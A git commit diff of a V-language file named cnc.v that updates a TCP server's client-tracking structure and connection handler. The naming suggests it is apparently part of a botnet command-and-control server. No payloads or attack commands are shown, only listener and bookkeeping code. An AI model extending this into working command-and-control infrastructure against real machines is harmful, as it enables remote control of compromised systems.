b77338098634913a3426bf0aaed96f31e209ba80
x0tic0 <87556649+x0tic0@users.noreply.github.com>
2021-11-17 13:46:02 -0500

    Update cnc.v

--- server/cnc.v
+++ server/cnc.v
@@ -2,35 +2,40 @@ module server
 
 import os
 import net
+import time
 import server
 
 pub struct Clients{
 	pub mut:
 		user_count		int
-		users			[]string
-		sockets			[]net.TcpConn
+		u_name			[]string
+		u_sockets		[]net.TcpConn
+		u_ip			[]string
+		u_port			[]int
 		using_client	[]bool
-
 }
 
 pub struct Server{
 	pub mut:
 		port 			string
 		cnc_key 		string
+		clients			&Clients
 }
 
 
-pub fn (mut s Server) start_skillec(port) {
-	mut server := net.listen_tcp(.ip6, ':$port') or { panic("[x] Error, Unable to bind server. Port is being used!") }
+pub fn (mut s Server) start_skrillec(port int) {
+	mut start_clients := Clients{}
+	mut svr := net.listen_tcp(.ip6, ":$port") or { panic("[x] Error, Unable to bind server. Port is being used!") }
 	for {
-		mut socket := server.accept() or { panic("[x] Error, Unable to accept the incoming connection!") }
+		mut socket := svr.accept() or { panic("[x] Error, Unable to accept the incoming connection!") }
 		socket.set_read_timeout(time.infinite)
 		go s.connection_handler(mut socket)
 	}
 }
 
-pub fn (mut s Server) connection_handler(mut socket et.TcpConn, mut c server.Clients) {
-	mut user_ip = socket.peer_addr() or { "" }
+pub fn (mut s Server) connection_handler(mut socket net.TcpConn) {
+	mut user_ip := socket.peer_addr() or { return }
+	server.cmd_handler(mut socket, mut &s)
 }
 
 /*
@@ -38,9 +43,11 @@ pub fn (mut s Server) connection_handler(mut socket et.TcpConn, mut c server.Cli
 */
 
 pub fn (mut c Clients) get_ip(username string) string {
-	for i in 0..(c.sockets) {
-		if c.users == username {
-			return c.sockets.peer_addr() or { "[x] Failed to get Client's IP Address!" }
+	for i in 0..(c.u_sockets).len {
+		if c.u_name[i] == username {
+			ip := c.u_sockets[i].peer_addr() or { panic("[x] Error") }
+			return "$ip"
 		}
 	}
+	return ""
 }
